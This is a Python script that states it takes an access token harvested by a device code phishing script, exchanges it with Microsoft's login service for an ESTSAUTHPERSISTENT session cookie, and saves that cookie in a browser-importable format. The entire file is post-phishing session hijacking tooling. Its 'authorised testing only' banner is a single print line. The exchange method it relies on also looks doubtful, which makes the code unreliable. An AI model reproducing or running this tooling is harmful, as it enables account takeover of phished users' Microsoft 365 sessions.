#!/usr/bin/env python3
"""
get_cookie_v2.py – Uses the original access token (from device code phishing)
to obtain the real ESTSAUTHPERSISTENT cookie.
"""

import requests
import json

# Path to the token file created by the phishing script
TOKEN_FILE = "unknown_user.txt"

def main():
    # 1. Read the saved token file
    with open(TOKEN_FILE, "r") as f:
        tokens = json.load(f)

    access_token = tokens["access_token"]
    print("[*] Using access token (truncated):", access_token[:50] + "...")

    # 2. Request the session cookie
    cookie_url = "https://login.microsoftonline.com/common/GetCredentialType"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json",
        "Accept": "application/json"
    }
    body = {
        "resource": "https://graph.microsoft.com"   # matches the token's audience
    }

    print("[*] Requesting session cookie...")
    resp = requests.post(cookie_url, headers=headers, json=body)

    # 3. Print full response for debugging
    print("\n--- Full Response ---")
    print("Status:", resp.status_code)
    print("Headers:", dict(resp.headers))
    try:
        print("JSON:", json.dumps(resp.json(), indent=2))
    except:
        print("Text:", resp.text)

    # 4. Try to extract the real cookie
    try:
        data = resp.json()
        cookie_value = (data.get("estssauthenticationpersistent") or
                        data.get("ESTSAUTHPERSISTENT") or
                        data.get("Credential"))
    except:
        cookie_value = None

    if not cookie_value:
        # fallback to Set-Cookie header
        set_cookie = resp.headers.get("Set-Cookie", "")
        print("\nSet-Cookie header:", set_cookie)
        # Look for ESTSAUTHPERSISTENT in the header
        for part in set_cookie.split(","):
            if "ESTSAUTHPERSISTENT=" in part:
                cookie_value = part.split("ESTSAUTHPERSISTENT=")[1].split(";")[0]
                break

    if cookie_value:
        # Save as JSON for EditThisCookie
        cookie_obj = {
            "domain": ".login.microsoftonline.com",
            "name": "ESTSAUTHPERSISTENT",
            "value": cookie_value,
            "path": "/",
            "secure": True,
            "httpOnly": True
        }
        with open("sessioncookie.json", "w") as f:
            json.dump([cookie_obj], f, indent=2)
        print(f"\n[+] Real cookie saved to sessioncookie.json")
    else:
        print("\n[-] Could not find ESTSAUTHPERSISTENT. Check the output above.")

if __name__ == "__main__":
    print("=" * 60)
    print("WARNING: Authorised testing only.")
    print("=" * 60)
    input("Press Enter to continue...")
    main()